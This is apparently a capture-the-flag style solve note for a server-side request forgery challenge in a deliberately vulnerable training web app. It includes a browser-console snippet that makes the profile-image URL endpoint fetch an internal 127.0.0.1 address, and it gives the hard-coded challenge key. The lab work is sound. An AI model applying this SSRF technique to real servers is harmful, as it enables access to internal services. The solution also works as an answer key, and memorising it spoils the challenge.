SSRF challenge trigger (source): `routes/profileImageUrlUpload.ts` sets `req.app.locals.abused_ssrf_bug=true` iff `imageUrl` matches `/.*solve\/challenges\/server-side.*/`.

So solve flow is:
1) Ensure you have **cookie token** set (endpoint uses `authenticatedUsers.get(req.cookies.token)`; Bearer-only often fails). If needed: after login, do `document.cookie='token='[REDACTED]'; path=/'` then `fetch('/rest/user/whoami',{credentials:'include'})`.
2) POST `/profile/image/url` as **FormData** with `imageUrl` containing `.../solve/challenges/server-side?...` (e.g. `http://127.0.0.1:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3`).
3) Then request `/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3` (expect **204**).

Console snippet:
```js
const fd=new FormData();
fd.append('imageUrl','http://127.0.0.1:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3');
await fetch('/profile/image/url',{method:'POST',body:fd,credentials:'include'});
await fetch('/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3',{credentials:'include'}).then(r=>r.status).then(console.log);
```

